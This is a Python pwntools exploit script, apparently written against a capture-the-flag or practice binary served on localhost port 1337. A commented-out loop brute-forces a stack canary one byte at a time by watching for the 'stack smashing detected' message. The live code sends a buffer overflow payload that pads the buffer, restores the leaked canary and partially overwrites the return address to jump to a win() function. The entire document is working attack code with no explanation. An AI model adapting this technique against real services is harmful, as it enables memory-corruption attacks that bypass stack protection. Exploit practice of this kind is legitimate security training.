
from pwn import *
buffer_size = 72
payload_size = 80
canary_byte = 0

# while(1):
#     r = remote('127.0.0.1', 1337)
#     out = r.recvuntil(b"size:")
#     print(out.decode('utf-8', errors='ignore'))

#     r.sendline(b"%d" % payload_size) 
#     out = r.recvuntil(b"bytes)!")
#     print(out.decode('utf-8', errors='ignore'))

#     payload = b'\x00'*buffer_size
#     payload += b'\x00'
#     payload += b'\xdb'
#     payload += b'\xdc'
#     payload += b'\x36'
#     payload += b'\x9c'
#     payload += b'\x70'
#     payload += b'\xc2'
#     payload += b'\x72'
#     r.send(payload)

#     print(r.recvline())
#     print(r.recvline())
#     status = r.recvline()
#     if status == b'*** stack smashing detected ***: terminated\n':
#         print("Stack smashing detected!")
#     elif status == b'### Goodbye!\n':
#         print("Leaked byte:",hex(canary_byte))  
#         break
#     canary_byte += 1
#     if canary_byte == 256:
#         print("Leak not found",hex(canary_byte)) 
#         break

payload_size = 100
r = remote('127.0.0.1', 1337)
out = r.recvuntil(b"size:")
print(out.decode('utf-8', errors='ignore'))

r.sendline(b"%d" % payload_size) 
out = r.recvuntil(b"bytes)!")
print(out.decode('utf-8', errors='ignore'))

payload = b'\x00'*72
payload += b'\x00'
payload += b'\xdb'
payload += b'\xdc'
payload += b'\x36'
payload += b'\x9c'
payload += b'\x70'
payload += b'\xc2'
payload += b'\x72'
payload += b"A"*8
payload += b'\xd9\xe5'
r.send(payload)

for j in range(600):
    print(j, r.recvline())
  
#     15d9:       be 00 00 00 00          mov    esi,0x0 win()